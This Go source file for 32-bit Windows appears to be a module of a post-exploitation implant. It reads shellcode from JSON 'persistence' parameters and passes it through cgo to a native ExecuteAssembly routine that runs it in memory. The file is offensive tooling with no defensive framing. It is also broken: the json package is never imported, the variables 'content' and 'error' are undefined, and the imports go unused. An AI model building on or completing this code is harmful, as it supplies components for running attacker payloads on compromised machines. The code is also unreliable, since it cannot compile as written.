// +build 386

package windows_executeassembly_windows

import (

    "fmt"
    "io/ioutil"
    "os"
    "unsafe"

)


/*
#cgo CXXFLAGS: -I"../../../../../winDependencies/includes/"
#cgo LDFLAGS: -L"../../../../../winDependencies/libs/x86/" -static
#include "windows_executeassembly_windows.h"
#include <stdlib.h>
*/
import "C"


type BiExecuteAssembly struct {
    Shellcode string   `json:"shellcode"`
}

var moduleParams *BiExecuteAssembly


func ExecuteAssembly(jsonPersistence string,blob string) (bool,string){
    
    errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
    if errDaws != nil{
        return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
    }

    
    var ptrShellcode *C.char = C.CString(moduleParams.Shellcode)
    defer C.free(unsafe.Pointer(ptrShellcode))

    var size_shellcode C.int = C.int(len(content))


    ptrError := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrError))

    C.ExecuteAssembly((*C.char)(ptrShellcode),size_shellcode,(*C.char)(ptrError))

    errorString := C.GoString((*C.char)(ptrError))
    if (error != 1){

        return true,"Execute Assembly Error:" + string(errorString)
    }


    return false,"Assemly Executed"
}
